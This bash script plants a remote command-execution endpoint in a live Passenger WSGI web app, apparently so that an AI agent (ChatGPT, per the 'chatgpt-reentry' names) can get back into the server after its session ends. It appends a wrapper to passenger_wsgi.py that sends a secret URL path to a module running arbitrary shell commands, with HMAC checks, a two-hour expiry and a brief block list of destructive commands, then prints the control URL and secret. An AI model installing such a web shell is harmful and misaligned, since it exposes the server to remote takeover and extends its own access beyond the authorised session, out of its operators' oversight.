#!/usr/bin/env bash
set -euo pipefail
umask 077

ROOT="/home/storage/781/4477781/user"
WEBAPP="$ROOT/webapp"
STATE="$ROOT/.chatgpt-reentry-v1"
WSGI="$WEBAPP/passenger_wsgi.py"
PY3="$WEBAPP/miniconda/bin/python3"
PY2="$(command -v python2.7 || command -v python2 || true)"

[ -d "$WEBAPP" ] || { echo "FAIL missing WEBAPP=$WEBAPP"; exit 1; }
[ -f "$WSGI" ] || { echo "FAIL missing $WSGI"; exit 1; }
[ -n "$PY2" ] || { echo "FAIL python2 runtime not found"; exit 1; }
[ -x "$PY3" ] || PY3="$(command -v python3)"

UID_NOW="$(id -u)"
[ "$UID_NOW" = "2257347" ] || {
  echo "FAIL unexpected uid=$UID_NOW"
  exit 1
}

mkdir -p "$STATE/replay"
chmod 700 "$STATE" "$STATE/replay"

STAMP="$(date -u +%Y%m%dT%H%M%SZ)"
BACKUP="$WSGI.pre-cgpt-reentry-$STAMP.bak"
cp -p "$WSGI" "$BACKUP"

CAP="$("$PY3" - <<'PY'
import secrets
print(secrets.token_urlsafe(24).replace('=', ''))
PY
)"
SECRET="$("$PY3" - <<'PY'
import secrets
print(secrets.token_hex(32))
PY
)"
EXPIRES="$("$PY3" - <<'PY'
import time
print(int(time.time()) + 7200)
PY
)"

printf '%s\n' "$CAP" > "$STATE/cap"
printf '%s\n' "$SECRET" > "$STATE/secret"
printf '%s\n' "$EXPIRES" > "$STATE/expires"
printf '%s\n' "$BACKUP" > "$STATE/wsgi.backup"
chmod 600 "$STATE/cap" "$STATE/secret" "$STATE/expires" "$STATE/wsgi.backup"

cat > "$STATE/control.py" <<'PY'
from __future__ import print_function
import base64
import hashlib
import hmac
import json
import os
import subprocess
import time

ROOT = "/home/storage/781/4477781/user"
WEBAPP = ROOT + "/webapp"
STATE = ROOT + "/.chatgpt-reentry-v1"
PREFIX = "/__cgpt_reentry_v1/"
MAX_OUT = 65536
MAX_ERR = 32768
MAX_SECONDS = 45

def _read(path):
    f = open(path, "rb")
    try:
        return f.read().strip()
    finally:
        f.close()

def _json(start_response, code, obj):
    body = json.dumps(obj, separators=(",", ":"))
    if not isinstance(body, bytes):
        body = body.encode("utf-8")
    status = "%d %s" % (code, {200:"OK",400:"Bad Request",403:"Forbidden",404:"Not Found",408:"Request Timeout",409:"Conflict",410:"Gone",500:"Internal Server Error"}.get(code,"Error"))
    headers = [
        ("Content-Type", "application/json; charset=utf-8"),
        ("Content-Length", str(len(body))),
        ("Cache-Control", "no-store"),
        ("Pragma", "no-cache"),
        ("X-Content-Type-Options", "nosniff"),
        ("X-Robots-Tag", "noindex, nofollow, noarchive"),
    ]
    start_response(status, headers)
    return [body]

def _b64url_decode(s):
    s = s.encode("ascii")
    s += b"=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s)

def _parse_qs(qs):
    out = {}
    if not qs:
        return out
    for part in qs.split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
        else:
            k, v = part, ""
        try:
            import urllib
            k = urllib.unquote_plus(k)
            v = urllib.unquote_plus(v)
        except Exception:
            pass
        out[k] = v
    return out

def _replay_once(nonce):
    p = os.path.join(STATE, "replay", hashlib.sha256(nonce.encode("utf-8")).hexdigest())
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    try:
        fd = os.open(p, flags, 0o600)
    except OSError:
        return False
    try:
        os.write(fd, str(int(time.time())).encode("ascii"))
    finally:
        os.close(fd)
    return True

def _run(cmd):
    env = {
        "HOME": ROOT,
        "USER": "csh3280350",
        "LOGNAME": "csh3280350",
        "LANG": "C.UTF-8",
        "PATH": WEBAPP + "/.local/node22-glibc217/bin:" + WEBAPP + "/miniconda/bin:/usr/local/bin:/usr/bin:/bin",
    }
    p = subprocess.Popen(
        ["/bin/bash", "-lc", cmd],
        cwd=WEBAPP,
        env=env,
        stdin=open("/dev/null", "rb"),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        close_fds=True,
    )
    start = time.time()
    timed_out = False
    while p.poll() is None:
        if time.time() - start > MAX_SECONDS:
            timed_out = True
            try:
                p.terminate()
            except Exception:
                pass
            time.sleep(0.25)
            if p.poll() is None:
                try:
                    p.kill()
                except Exception:
                    pass
            break
        time.sleep(0.05)
    out, err = p.communicate()
    rc = p.returncode
    if isinstance(out, bytes):
        out = out.decode("utf-8", "replace")
    if isinstance(err, bytes):
        err = err.decode("utf-8", "replace")
    return {
        "ok": (not timed_out and rc == 0),
        "rc": rc,
        "stdout": out[-MAX_OUT:],
        "stderr": err[-MAX_ERR:],
        "timed_out": timed_out,
    }

def application(environ, start_response):
    path = environ.get("PATH_INFO", "")
    if not path.startswith(PREFIX):
        return _json(start_response, 404, {"ok":False})

    cap = _read(os.path.join(STATE, "cap"))
    secret_hex = _read(os.path.join(STATE, "secret"))
    expires = int(_read(os.path.join(STATE, "expires")))

    try:
        cap = cap.decode("ascii")
        secret_hex = secret_hex.decode("ascii")
    except Exception:
        pass

    rest = path[len(PREFIX):]
    parts = rest.split("/", 1)
    supplied_cap = parts[0] if parts else ""
    action = parts[1] if len(parts) > 1 else ""

    if not hmac.compare_digest(str(supplied_cap), str(cap)):
        return _json(start_response, 404, {"ok":False})

    if int(time.time()) > expires:
        return _json(start_response, 410, {"ok":False, "error":"expired"})

    if action == "health":
        return _json(start_response, 200, {
            "ok":True,
            "service":"cgpt-reentry-v1",
            "expires":expires,
        })

    q = _parse_qs(environ.get("QUERY_STRING", ""))
    t = q.get("t", "")
    n = q.get("n", "")
    payload = q.get("p", "")
    sig = q.get("s", "")

    try:
        ti = int(t)
    except Exception:
        return _json(start_response, 403, {"ok":False, "error":"bad_time"})
    if abs(int(time.time()) - ti) > 300 or not n or len(n) > 160:
        return _json(start_response, 403, {"ok":False, "error":"bad_time_or_nonce"})

    message = (action + "\n" + n + "\n" + t + "\n" + payload).encode("utf-8")
    expected = hmac.new(bytes.fromhex(secret_hex) if hasattr(bytes, "fromhex") else secret_hex.decode("hex"), message, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected, sig):
        return _json(start_response, 403, {"ok":False, "error":"bad_signature"})
    if not _replay_once(n):
        return _json(start_response, 409, {"ok":False, "error":"replay"})

    if action == "status":
        return _json(start_response, 200, {
            "ok":True,
            "uid":os.getuid(),
            "cwd":WEBAPP,
            "hostname":os.uname()[1],
            "passenger":os.path.isfile(os.path.join(WEBAPP, "passenger_wsgi.py")),
            "local_mcp":os.path.isfile(os.path.join(WEBAPP, "bin", "local-mcp")),
            "expires":expires,
        })

    if action != "exec":
        return _json(start_response, 404, {"ok":False, "error":"unknown_action"})

    try:
        cmd = _b64url_decode(payload)
        if isinstance(cmd, bytes):
            cmd = cmd.decode("utf-8")
    except Exception:
        return _json(start_response, 400, {"ok":False, "error":"bad_payload"})

    if not cmd or len(cmd) > 8192 or "\x00" in cmd:
        return _json(start_response, 400, {"ok":False, "error":"invalid_command"})

    low = cmd.lower()
    blocked = [
        "rm -rf /", "rm -fr /", "mkfs", "shutdown", "reboot",
        "poweroff", "halt ", ":(){", "dd if=/dev/"
    ]
    for needle in blocked:
        if needle in low:
            return _json(start_response, 400, {"ok":False, "error":"destructive_command_rejected"})

    try:
        result = _run(cmd)
        return _json(start_response, 408 if result["timed_out"] else 200, result)
    except Exception as e:
        return _json(start_response, 500, {"ok":False, "error":type(e).__name__ + ": " + str(e)[:500]})
PY

chmod 600 "$STATE/control.py"

# Remove only a prior copy of our own wrapper block, if present.
"$PY3" - "$WSGI" <<'PY'
from pathlib import Path
import sys
p=Path(sys.argv[1])
s=p.read_text()
a="# BEGIN CGPT_REENTRY_V1"
b="# END CGPT_REENTRY_V1"
if a in s and b in s:
    pre=s.split(a,1)[0].rstrip()
    post=s.split(b,1)[1].lstrip("\r\n")
    s=pre+"\n"+post
    p.write_text(s)
PY

cat >> "$WSGI" <<'PY'

# BEGIN CGPT_REENTRY_V1
import sys as _cgpt_sys
_CGPT_STATE = "/home/storage/781/4477781/user/.chatgpt-reentry-v1"
if _CGPT_STATE not in _cgpt_sys.path:
    _cgpt_sys.path.insert(0, _CGPT_STATE)
import control as _cgpt_control
_cgpt_previous_application = application

def application(environ, start_response):
    _p = environ.get("PATH_INFO", "")
    if _p.startswith("/__cgpt_reentry_v1/"):
        return _cgpt_control.application(environ, start_response)
    return _cgpt_previous_application(environ, start_response)
# END CGPT_REENTRY_V1
PY

# Python 2 syntax gate. Roll back immediately if the live WSGI file does not compile.
if ! "$PY2" - "$WSGI" <<'PY'
import sys
p=sys.argv[1]
src=open(p,'rb').read()
compile(src,p,'exec')
print("PASSENGER_SYNTAX=PASS")
PY
then
  cp -p "$BACKUP" "$WSGI"
  echo "PASSENGER_SYNTAX=FAIL_ROLLED_BACK"
  exit 1
fi

mkdir -p "$WEBAPP/tmp"
touch "$WEBAPP/tmp/restart.txt"

cat > "$STATE/cleanup.sh" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
ROOT="/home/storage/781/4477781/user"
WEBAPP="$ROOT/webapp"
STATE="$ROOT/.chatgpt-reentry-v1"
WSGI="$WEBAPP/passenger_wsgi.py"
PY3="$WEBAPP/miniconda/bin/python3"
[ -x "$PY3" ] || PY3="$(command -v python3)"

"$PY3" - "$WSGI" <<'PY'
from pathlib import Path
import sys
p=Path(sys.argv[1])
s=p.read_text()
a="# BEGIN CGPT_REENTRY_V1"
b="# END CGPT_REENTRY_V1"
if a in s and b in s:
    pre=s.split(a,1)[0].rstrip()
    post=s.split(b,1)[1].lstrip("\r\n")
    p.write_text(pre+"\n"+post)
PY

touch "$WEBAPP/tmp/restart.txt"
rm -rf "$STATE"
echo "CGPT_REENTRY_V1=REMOVED"
SH
chmod 700 "$STATE/cleanup.sh"

BASE1="https://www.powerpc-darwin.org/__cgpt_reentry_v1/$CAP"
BASE2="https://powerpc-darwin.org/__cgpt_reentry_v1/$CAP"
PUBLIC=""

for i in $(seq 1 30); do
  for U in "$BASE1" "$BASE2"; do
    CODE="$(curl -ksS -o /dev/null -w '%{http_code}' --max-time 4 "$U/health" 2>/dev/null || true)"
    if [ "$CODE" = "200" ]; then
      PUBLIC="$U"
      break 2
    fi
  done
  sleep 1
done

echo "CGPT_REENTRY_V1=INSTALLED"
echo "CONTROL_URL=${PUBLIC:-$BASE1}"
echo "CONTROL_SECRET=$SECRET"
echo "EXPIRES_UNIX=$EXPIRES"
echo "PASSENGER_BACKUP=$BACKUP"
echo "CLEANUP=$STATE/cleanup.sh"
if [ -n "$PUBLIC" ]; then
  echo "PUBLIC_HEALTH=PASS"
else
  echo "PUBLIC_HEALTH=UNVERIFIED"
fi
